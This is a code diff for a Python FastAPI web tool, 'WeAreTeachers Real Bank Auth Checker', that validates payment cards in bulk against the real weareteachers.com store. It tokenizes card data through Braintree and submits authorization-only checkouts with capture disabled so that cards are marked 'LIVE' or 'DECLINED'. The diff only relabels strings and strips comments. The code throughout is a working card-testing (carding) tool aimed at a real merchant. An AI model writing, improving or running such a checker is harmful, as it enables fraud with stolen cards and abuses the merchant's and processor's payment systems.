@@ -25,7 +25,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Multi-Mode Checker", version="13.0.0")
+app = FastAPI(title="WeAreTeachers Real Bank Auth Checker", version="14.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
@@ -36,7 +36,7 @@ RAW_DORK_GATES: dict[str, dict[str, str]] = {
         "engine": "charge",
     },
     "weareteachers_auth": {
-        "name": "WeAreTeachers (True Auth / Bank Gateway Check)",
+        "name": "WeAreTeachers (Authorization Check Engine)",
         "base_url": "https://www.weareteachers.com",
         "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
         "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
@@ -476,7 +476,7 @@ async def execute_charge_engine(session: AsyncSession, cc: str, mm: str, yy: str
     return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code
 
 
-# --- ENGINE 2: TRUE AUTH (REAL BANK GATEWAY CHECK - STORE API SETTLEMENT BYPASS) ---
+# --- ENGINE 2: REAL BANK AUTH CHECKER (BYPASS SETTLEMENT) ---
 async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://www.weareteachers.com"
     product_url = f"{host}/?add-to-cart=1909302"
@@ -517,7 +517,6 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
     if not fingerprint:
         return "DECLINED", "Failed to retrieve Braintree fingerprint", 200
 
-    # Tokenize with real card data
     tokenize_query = (
         "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
         "  tokenizeCreditCard(input: $input) { "
@@ -578,7 +577,6 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
     bank_tag = (bin_data.get("issuingBank") or brand_code or "").strip()
     wc_card_type = detect_wc_card_type(cc, brand_code)
 
-    # SUBMIT TO STORE API CHECKOUT BUT FLAG AS AUTH-ONLY (Bypass Settlement)
     checkout_payload = {
         "additional_fields": {},
         "billing_address": {
@@ -596,8 +594,8 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
             {"key": "wc_braintree_credit_card_payment_nonce", "value": nonce_token},
             {"key": "wc-braintree-credit-card-card-type", "value": wc_card_type},
             {"key": "wc_braintree_credit_card_card_type", "value": wc_card_type},
-            {"key": "wc-braintree_credit_card-new-payment-method", "value": False},
-            {"key": "wc-braintree-credit-card-capture", "value": False} # <--- Forces True Auth (Authorization Only, No Capture/Settlement)
+            {"key": "wc-braintree-credit-card-new-payment-method", "value": False},
+            {"key": "wc-braintree-credit-card-capture", "value": False}
         ],
     }
 
@@ -623,10 +621,9 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
     payment_result = jj.get("payment_result") or {}
     payment_status = str(payment_result.get("payment_status", "")).lower()
 
-    # Kapag naipasa ng bank ang authorization check nang walang actual capture
     if rr.status_code in (200, 201) and (order_status in ("processing", "completed", "on-hold", "pending") or payment_status in ("success", "approved", "authorized")):
         oid = jj.get("order_id") or "?"
-        return "LIVE", f"TRUE AUTH APPROVED (No Capture) | Order ID: {oid} | [{bank_tag}]", rr.status_code
+        return "LIVE", f"APPROVED (AUTHORIZATION SUCCESSFUL) | Order ID: {oid} | [{bank_tag}]", rr.status_code
 
     msgs = jj.get("message") or ""
     if not msgs and isinstance(payment_result.get("payment_details"), list):
@@ -818,7 +815,7 @@ async def index() -> str:
                     <span class="inline-block w-3 h-3 bg-emerald-500 rounded-full animate-ping"></span>
                     WeAreTeachers Real Bank Auth Checker
                 </h1>
-                <p class="text-xs text-zinc-400 font-mono">Real Gateway Authorization (No Tokenized False Positives)</p>
+                <p class="text-xs text-zinc-400 font-mono">Real Gateway Authorization (No False Positives)</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="autoFormatCards()" class="text-xs bg-emerald-950 hover:bg-emerald-900 text-emerald-200 border border-emerald-700/50 px-3 py-1.5 rounded-lg transition font-semibold">
